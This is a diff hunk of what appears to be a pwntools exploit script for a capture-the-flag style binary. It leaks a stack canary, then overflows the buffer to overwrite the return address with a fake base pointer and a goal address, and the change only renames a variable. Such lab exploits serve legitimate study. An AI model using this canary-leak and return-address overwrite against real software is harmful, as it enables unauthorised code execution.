@@ -22,11 +22,11 @@ p.sendline(b'A'*0x58)
 
 # 2. leak canary value
 p.recvuntil(b"Hello! ")
-canary_value = u64(b'\x00'+p.recv(0x60)[-7:])
-log.info(f"canary value: {hex(canary_value)}")
+canary_val = u64(b'\x00'+p.recv(0x60)[-7:])
+log.info(f"canary value: {hex(canary_val)}")
 
 # 3. overwrite return address
-p.sendline(b'A'*0x58+p64(canary_value)+p64(FAKE_RBP)+p64(GOAL_ADDR))
+p.sendline(b'A'*0x58+p64(canary_val)+p64(FAKE_RBP)+p64(GOAL_ADDR))
 
 p.interactive()
 
